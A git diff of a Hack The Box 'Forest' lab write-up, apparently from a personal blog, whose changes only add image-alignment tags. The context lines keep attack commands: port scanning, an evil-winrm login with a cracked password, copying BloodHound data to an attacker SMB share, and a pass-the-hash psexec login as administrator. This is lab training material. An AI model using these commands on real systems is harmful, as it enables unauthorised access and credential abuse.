@@ -8,7 +8,7 @@ image: https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Forest.png
 
 # Introdution
 
-[https://app.hackthebox.com/machines/Forest](https://app.hackthebox.com/machines/Forest)
+[https://app.hackthebox.com/machines/Forest](https://app.hackthebox.com/machines/Forest){: .left }
 
 This is a easy windows machine. It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.
 
@@ -37,12 +37,12 @@ First step is to enumerate the box. For this we’ll use `nmap`.
 ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
 ```
 
-[](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/scan-forest.png)
+[](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/scan-forest.png){: .left }
 
  
 We identified the `htb.local` domain, so add it in **/etc/hosts**
 
-![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled.png){: .left }
 
 
 
@@ -370,7 +370,7 @@ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 
 ### HABEMUSS!!!
 
-![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%201.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%201.png){: .left }
 
 
 # Post Exploration
@@ -416,7 +416,7 @@ copy 20221018071247_BloodHound.zip \\10.10.14.2\\samba
 
 We have the road to success in the section `Find Shortest Paths to Domain Admins`
 
-![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%202.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%202.png){: .left }
 
 
 ## Privilege Escalation (svc-alfresco → Administrator )
@@ -586,7 +586,7 @@ We will do a PTH attack with PsExec:
 impacket-psexec administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
 ```
 
-![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%203.png)
+![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Forest/Untitled%203.png){: .left }
 
 **HABEMUS ROOT!!!**
 
